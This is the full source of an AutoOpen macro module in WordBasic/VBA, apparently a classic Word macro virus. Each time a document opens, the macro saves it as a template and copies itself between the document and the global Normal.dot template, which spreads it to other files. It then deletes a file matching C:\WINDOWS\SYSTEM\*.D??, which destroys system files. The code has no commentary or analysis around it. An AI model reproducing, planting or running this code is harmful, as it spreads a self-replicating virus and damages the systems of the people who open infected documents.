   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim source$
   Dim target$
   Dim fname$
   Dim del$
       source$ = WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)) + ":AutoOpen"
       target$ = WordBasic.[FileName$]() + ":AutoOpen"
       fname$ = WordBasic.[FileName$]()
       WordBasic.FileSaveAs Name:=fname$, Format:=1
       If (InStr(UCase(source$), "NORMAL.DOT") = 0) Then
               WordBasic.MacroCopy source$, "Global:AutoOpen"
       Else
               WordBasic.MacroCopy "Global:AutoOpen", target$
       End If
       del$ = WordBasic.[Files$]("C:\WINDOWS\SYSTEM\*.D??")
       WordBasic.Kill del$
   End Sub
